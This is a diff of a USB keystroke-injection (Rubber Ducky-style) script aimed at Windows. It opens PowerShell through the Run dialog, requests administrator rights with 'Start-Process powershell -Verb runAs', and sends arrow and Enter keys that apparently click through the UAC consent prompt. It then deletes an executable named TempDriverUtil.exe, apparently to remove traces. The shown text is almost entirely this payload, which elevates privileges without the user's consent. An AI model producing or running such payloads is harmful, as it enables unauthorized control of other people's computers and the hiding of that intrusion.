@@ -1,16 +1,12 @@
 DELAY 100
 WINDOWS r
-DELAY 200
-STRING powershell
-DELAY 100
+DELAY 150
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 50
 ENTER
-DELAY 500
-STRING start-process Powershell -verb runas
-DELAY 200
-ENTER
-DELAY 500
+DELAY 400
 LEFTARROW
-DELAY 300
+DELAY 200
 ENTER
 DELAY 700
 REM **CUSTOMIZATION** Use these variables to pick what the program does
@@ -37,10 +33,6 @@ ENTER
 DELAY 50
 STRING remove-item "C:\Program Files (x86)\Temp\TempDriverUtil.exe"
 DELAY 100
-ENTER
-DELAY 100
-STRING exit
-DELAY 50
 ENTER
 DELAY 100
 STRING exit
